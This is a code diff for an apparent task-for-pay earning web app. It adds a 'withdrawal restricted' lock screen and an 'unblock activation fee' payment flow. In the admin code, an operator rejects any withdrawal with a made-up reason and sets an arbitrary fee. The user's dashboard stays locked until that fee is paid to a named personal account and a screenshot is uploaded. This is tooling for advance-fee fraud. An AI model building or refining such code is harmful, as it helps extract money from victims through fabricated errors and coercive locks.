@@ -43,11 +43,13 @@
         .bg-withdraw { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
         .bg-task { background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%); }
 
-        /* Error/Lock Banner Dashboard */
-        .error-lock-banner { background: #fef2f2; border: 2px solid #fca5a5; border-radius: 20px; padding: 16px; margin-bottom: 20px; display: none; }
+        /* Error/Lock Banner Dashboard Clickable */
+        .error-lock-banner { background: #fef2f2; border: 2px solid #fca5a5; border-radius: 20px; padding: 16px; margin-bottom: 20px; display: none; cursor: pointer; transition: transform 0.2s; }
+        .error-lock-banner:active { transform: scale(0.98); }
         .error-lock-banner h4 { color: #dc2626; font-size: 1rem; font-weight: 800; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
         .error-lock-banner p { font-size: 0.85rem; color: #7f1d1d; font-weight: 600; margin-bottom: 10px; }
         .error-lock-banner .fee-highlight { background: #fee2e2; padding: 6px 12px; border-radius: 8px; font-weight: 700; color: #b91c1c; font-size: 0.85rem; display: inline-block; }
+        .error-lock-banner .click-instruction { font-size: 0.8rem; margin-top: 10px; font-weight: 800; color: #2563eb; text-decoration: underline; display: flex; align-items: center; gap: 5px; }
 
         /* --- SCREEN HEADERS --- */
         .screen-header { display: flex; align-items: center; gap: 15px; margin: 15px 0 25px 0; }
@@ -150,12 +152,13 @@
         <!-- ================= HOME VIEW ================= -->
         <div id="homeView" class="app-view">
             
-            <!-- Clear Dashboard Error Notification Banner -->
-            <div class="error-lock-banner" id="dashboard-lock-banner">
+            <!-- Clickable Dashboard Error Notification Banner -->
+            <div class="error-lock-banner" id="dashboard-lock-banner" onclick="openLockFeeGateway()">
                 <h4><i class="fa-solid fa-triangle-exclamation"></i> Withdrawal Restricted!</h4>
                 <p id="lock-reason-text">Aapka pichla withdrawal admin ki taraf se reject ho chuka hai.</p>
                 <div class="fee-highlight" id="lock-fee-text">Required Activation Fee: Rs 0.00</div>
-                <p style="font-size: 0.75rem; margin-top: 8px; color: #991b1b;">💡 Note: Aap daily video tasks perform kar ke earning jari rakh sakte hain.</p>
+                <p style="margin-top:6px; font-size:0.85rem; color:#7f1d1d; font-weight:700;">Jab tak aap yeh masla solve nahi karenge tab tak aap naya withdrawal nahi kar sakte.</p>
+                <div class="click-instruction"><i class="fa-solid fa-hand-pointer"></i> Abhi masla hal karne ke liye yahan click karein</div>
             </div>
 
             <div class="main-balance-wrapper">
@@ -245,7 +248,7 @@
                     <div class="acc-info-row"><span>Account Name:</span><span>Muhammad Israr khan</span></div>
                 </div>
 
-                <div class="input-group"><label>SENT AMOUNT (PKR)</label><input type="number" id="pay-amount" placeholder="Enter exact plan amount"></div>
+                <div class="input-group"><label id="payment-amount-label">SENT AMOUNT (PKR)</label><input type="number" id="pay-amount" placeholder="Enter exact required amount"></div>
                 <div class="input-group"><label>TRANSACTION SCREENSHOT</label><input type="file" id="pay-screenshot" accept="image/*" style="padding:10px;"></div>
 
                 <button class="submit-btn" style="background:linear-gradient(135deg, #ea580c 0%, #c2410c 100%);" onclick="submitDepositToAdminQueue()">Submit Verification</button>
@@ -290,7 +293,7 @@
                 <h1 class="screen-title" style="color: #ea580c;"><i class="fa-solid fa-user-shield"></i> Master Panel</h1>
             </div>
             
-            <div class="admin-section-title"><i class="fa-solid fa-hourglass-half"></i> Pending Plan Deposits</div>
+            <div class="admin-section-title"><i class="fa-solid fa-hourglass-half"></i> Pending Plan Deposits / Restriction Fees</div>
             <div id="admin-deposits-queue"></div>
 
             <div class="admin-section-title"><i class="fa-solid fa-money-bill-wave"></i> Pending Withdrawals</div>
@@ -341,6 +344,7 @@
         window.switchView = switchView;
         window.checkPlanBeforeTasks = checkPlanBeforeTasks;
         window.openCheckoutGateway = openCheckoutGateway;
+        window.openLockFeeGateway = openLockFeeGateway;
         window.closeCheckoutGateway = closeCheckoutGateway;
         window.submitDepositToAdminQueue = submitDepositToAdminQueue;
         window.claimRewardAndNext = claimRewardAndNext;
@@ -360,7 +364,7 @@
             document.getElementById('total-withdraw').innerText = currentSession.total_withdraw.toFixed(2);
             document.getElementById('total-deposit').innerText = currentSession.total_deposit.toFixed(2);
             
-            // Check Account Lock Rules
+            // Lock Rules Check
             const banner = document.getElementById('dashboard-lock-banner');
             if(currentSession.isLocked === true) {
                 banner.style.display = 'block';
@@ -490,9 +494,20 @@
         }
 
         function openCheckoutGateway(name, price, videosCount) {
-            pendingCheckout = { name: name, price: price, videosCount: videosCount };
+            pendingCheckout = { type: "plan", name: name, price: price, videosCount: videosCount };
             document.getElementById('checkout-plan-name').innerText = `Activate ${name} - Rs ${price}`;
-            document.getElementById('pay-amount').value = "";
+            document.getElementById('payment-amount-label').innerText = "SENT AMOUNT (PKR)";
+            document.getElementById('pay-amount').value = price;
+            document.getElementById('pay-screenshot').value = "";
+            document.getElementById('checkoutGateway').style.display = 'flex';
+        }
+
+        function openLockFeeGateway() {
+            if(!currentSession.isLocked) return;
+            pendingCheckout = { type: "unblock_fee", name: "Unblock Activation Fee", price: currentSession.lockFee, videosCount: 0 };
+            document.getElementById('checkout-plan-name').innerText = `Solve Error - Pay Rs ${currentSession.lockFee}`;
+            document.getElementById('payment-amount-label').innerText = "PAID ACTIVATION FEE (PKR)";
+            document.getElementById('pay-amount').value = currentSession.lockFee;
             document.getElementById('pay-screenshot').value = "";
             document.getElementById('checkoutGateway').style.display = 'flex';
         }
@@ -502,7 +517,6 @@
             pendingCheckout = null;
         }
 
-        // Base64 Reader For Handling Screenshot Delivery natively
         async function submitDepositToAdminQueue() {
             const enteredAmount = parseFloat(document.getElementById('pay-amount').value);
             const fileInput = document.getElementById('pay-screenshot').files[0];
@@ -524,10 +538,11 @@
                         videosCount: pendingCheckout.videosCount,
                         amountSent: enteredAmount,
                         screenshotData: base64Screenshot,
+                        type: pendingCheckout.type,
                         status: "pending"
                     });
                     closeCheckoutGateway();
-                    alert(`🎉 Deposit request submitted with screenshot! Wait for admin approval.`);
+                    alert(`🎉 Verification screenshot submitted successfully! Wait for admin review.`);
                     switchView('homeView');
                 } catch (e) { alert("Submission failed."); }
             }
@@ -609,9 +624,8 @@
         }
 
         async function submitWithdrawToAdminQueue() {
-            // Check Lock Rules First
             if(currentSession.isLocked === true) {
-                alert(`⚠️ Naya withdrawal tab tak nahi lag sakta jab tak aapka issue solve nahi ho jata! Reason: ${currentSession.lockReason}`);
+                alert(`⚠️ Naya withdrawal tab tak nahi lag sakta jab tak aapka error issue solve nahi ho jata! Home screen par red banner par click karke fee pay karein.`);
                 return;
             }
 
@@ -651,7 +665,7 @@
                 depSnap.forEach(d => {
                     const data = d.data();
                     if(data.userPhone === currentSession.phone) {
-                        container.innerHTML += `<div class="log-item"><div><b>${data.planName} Deposit</b><br><small>Rs ${data.amountSent}</small></div><span class="status-badge status-${data.status}">${data.status.toUpperCase()}</span></div>`;
+                        container.innerHTML += `<div class="log-item"><div><b>${data.planName}</b><br><small>Rs ${data.amountSent}</small></div><span class="status-badge status-${data.status}">${data.status.toUpperCase()}</span></div>`;
                     }
                 });
                 const witSnap = await getDocs(collection(db, "withdrawals"));
@@ -683,13 +697,13 @@
                         <div class="admin-action-row">
                             <input type="number" class="admin-input-small" id="input-balance-${data.phone}" placeholder="Update Balance">
                             <button class="admin-btn-action" onclick="adminUpdateUserBalance('${data.phone}')">Save</button>
-                            ${data.isLocked ? `<button class="admin-btn-action admin-btn-success" onclick="adminClearUserRestriction('${data.phone}')">Unblock User</button>` : ''}
+                            ${data.isLocked ? `<button class="admin-btn-action admin-btn-success" onclick="adminClearUserRestriction('${data.phone}')">Direct Unblock</button>` : ''}
                         </div>
                     </div>
                 `;
             });
 
-            // 2. Pending Deposits with Screenshots
+            // 2. Pending Deposits & Fee Screenshots
             const depContainer = document.getElementById('admin-deposits-queue');
             depContainer.innerHTML = "";
             const depSnapshot = await getDocs(collection(db, "deposits"));
@@ -698,14 +712,16 @@
                 const data = docObj.data();
                 if(data.status === "pending") {
                     highDepCheck = true;
+                    const isFee = data.type === "unblock_fee";
                     depContainer.innerHTML += `
-                        <div class="admin-card" style="border-left: 4px solid #d97706;">
-                            <div><b>User:</b> ${data.username} (${data.userPhone})</div>
-                            <div><b>Plan:</b> ${data.planName} (Rs ${data.planPrice})</div>
-                            <div><b>Sent:</b> Rs ${data.amountSent}</div>
+                        <div class="admin-card" style="border-left: 4px solid ${isFee ? '#6b21a8' : '#d97706'};">
+                            <div><span style="background:${isFee ? '#faf5ff' : '#fffbeb'}; color:${isFee ? '#6b21a8' : '#b45309'}; padding:2px 8px; font-size:0.75rem; font-weight:800; border-radius:4px;">${isFee ? 'RESTRICTION FEE' : 'PLAN DEPOSIT'}</span></div>
+                            <div style="margin-top:5px;"><b>User:</b> ${data.username} (${data.userPhone})</div>
+                            <div><b>Item/Title:</b> ${data.planName}</div>
+                            <div><b>Sent Amount:</b> Rs ${data.amountSent}</div>
                             <div><span class="view-proof-link" onclick="viewProofImage('${docObj.id}')"><i class="fa-solid fa-image"></i> View Screenshot Proof</span></div>
                             <div class="admin-action-row">
-                                <button class="admin-btn-action admin-btn-success" onclick="adminProcessDeposit('${docObj.id}', 'approved')">Accept Plan</button>
+                                <button class="admin-btn-action admin-btn-success" onclick="adminProcessDeposit('${docObj.id}', 'approved')">Approve Request</button>
                                 <button class="admin-btn-action admin-btn-danger" onclick="adminProcessDeposit('${docObj.id}', 'rejected')">Reject</button>
                             </div>
                             <div id="proof-container-${docObj.id}" style="display:none; margin-top:10px;"><img src="${data.screenshotData || ''}" style="width:100%; max-height:300px; border-radius:12px; object-fit:contain; border:1px solid #ccc;"/></div>
@@ -713,7 +729,7 @@
                     `;
                 }
             });
-            if(!highDepCheck) depContainer.innerHTML = "<p style='font-size:0.8rem; color:#64748b;'>No pending deposit requests.</p>";
+            if(!highDepCheck) depContainer.innerHTML = "<p style='font-size:0.8rem; color:#64748b;'>No pending submissions.</p>";
 
             // 3. Pending Withdrawals
             const witContainer = document.getElementById('admin-withdrawals-queue');
@@ -756,14 +772,25 @@
                     const userRef = doc(db, "users", depData.userPhone);
                     const userSnap = await getDoc(userRef);
                     const userData = userSnap.data();
-                    await updateDoc(userRef, {
-                        activePlanName: depData.planName, activePlanPrice: depData.planPrice,
-                        dailyVideosLimit: depData.videosCount, total_deposit: userData.total_deposit + depData.planPrice
-                    });
-                    alert("Plan activated successfully.");
-                } else { alert("Deposit rejected."); }
+
+                    if(depData.type === "unblock_fee") {
+                        // Clear Lock status completely if activation fee approved
+                        await updateDoc(userRef, {
+                            isLocked: false, lockReason: "", lockFee: 0,
+                            total_deposit: userData.total_deposit + depData.amountSent
+                        });
+                        alert("User restriction fee approved. Dashboard Unlocked!");
+                    } else {
+                        // Standard Plan setup
+                        await updateDoc(userRef, {
+                            activePlanName: depData.planName, activePlanPrice: depData.planPrice,
+                            dailyVideosLimit: depData.videosCount, total_deposit: userData.total_deposit + depData.planPrice
+                        });
+                        alert("Plan activated successfully.");
+                    }
+                } else { alert("Submission rejected."); }
                 loadAdminMasterDashboard();
-            } catch(e) { alert("Error."); }
+            } catch(e) { alert("Error handling process."); }
         }
 
         async function adminProcessWithdrawal(id, actionStatus) {
@@ -781,22 +808,21 @@
                     await updateDoc(userRef, { total_withdraw: userData.total_withdraw + witData.amount });
                     alert("Withdrawal successfully approved!");
                 } else {
-                    // Rejection Flow with prompts for custom message/fees
                     const reason = prompt("Withdrawal Reject karne ki wajah likhein (User Banner pe show hogi):", "Incorrect account details / Verification failed");
                     const feeStr = prompt("Is problem ko solve karne ki required solution fee kitni hai? (PKR):", "500");
                     const feeVal = parseFloat(feeStr) || 0;
 
-                    // Return ALL money back to wallet, and lock withdrawal access node
+                    // Return ALL money back to wallet, lock withdrawal axis node
                     await updateDoc(userRef, {
                         balance: userData.balance + witData.amount,
                         isLocked: true,
                         lockReason: reason || "Admin Rejected",
                         lockFee: feeVal
                     });
-                    alert("Withdrawal rejected! All funds returned to user wallet & dashboard has been locked.");
+                    alert("Withdrawal rejected! All funds returned to user wallet & dashboard locked.");
                 }
                 loadAdminMasterDashboard();
-            } catch(e) { alert("Error."); }
+            } catch(e) { alert("Error processing withdrawal."); }
         }
 
         async function adminClearUserRestriction(userPhoneId) {
